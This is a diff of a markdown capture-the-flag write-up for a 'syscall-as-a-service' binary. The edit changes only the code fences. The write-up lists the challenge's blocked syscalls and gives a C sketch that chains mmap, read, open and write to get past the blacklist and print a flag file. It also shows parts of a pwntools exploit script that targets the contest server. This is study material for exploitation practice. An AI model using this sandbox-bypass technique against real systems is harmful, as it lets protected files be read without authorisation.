@@ -4,16 +4,16 @@
 
 In this challenge we have a binary that let us make syscalls with arbitrary parameters; before starting to dig into the code we can make some checks with checksec and with strings.
 Checksec's output is:
-'''
+```
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-'''
+```
 So this is not looking good, everything is enabled. Analyzing the binary with strings doesn't reveal nothing really important, so the next step is to execute the binary.
 
-'''
+```
 $ ./saas 
 Welcome to syscall-as-a-service!
 
@@ -25,7 +25,7 @@ Enter r10 (decimal): 0
 Enter r9 (decimal): 0
 Enter r8 (decimal): 0
 Rax: 0x0
-'''
+```
 We are basically in a while true which lets us make syscalls with arbitrary parameters (and it shows us the return value). The first thing that came into my mind was to try and call execve, but the program will prevent us from calling some blacklisted syscalls (such as execve). The complete list of all the blocked syscall is: 0x3b, 0x39, 0x38, 0x3e, 0x65, 0xc8, 0x142.
 
 ## Solution
@@ -34,13 +34,13 @@ We cannot use execve, but we can still access many other syscalls. We can assume
 
 In C, what we want to do is as follow:
 
-'''
+```
 void* addr = mmap(0, 128, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
 read(stdin, addr, 9);
 int fd = open(addr, O_RDONLY, 0644);
 read(fd, addr, 64);
 write(stdout, addr, 64);
-'''
+```
 
 We have access to all this syscalls, we just need to convert our parameters to decimal:
 PROT_READ|PROT_WRITE = 3
@@ -53,7 +53,7 @@ stdout = 1
 At this point we just need a program that sends everything to the process' stdin, we just need to capture the retval of the mmap (for the address) and the retval of the open (for the file descriptor).
 The program is (in python) as follow (in this directory you will find the .py file):
 from pwn import *
-'''
+```
 #p = remote("jh2i.com", 50016)
 
 p = gdb.debug("./saas", """
@@ -122,4 +122,4 @@ p.recvuntil("r8 (decimal):")	#we can't read untill "Rax: 0x" because the flag is
 
 
 p.interactive()
-'''
+```
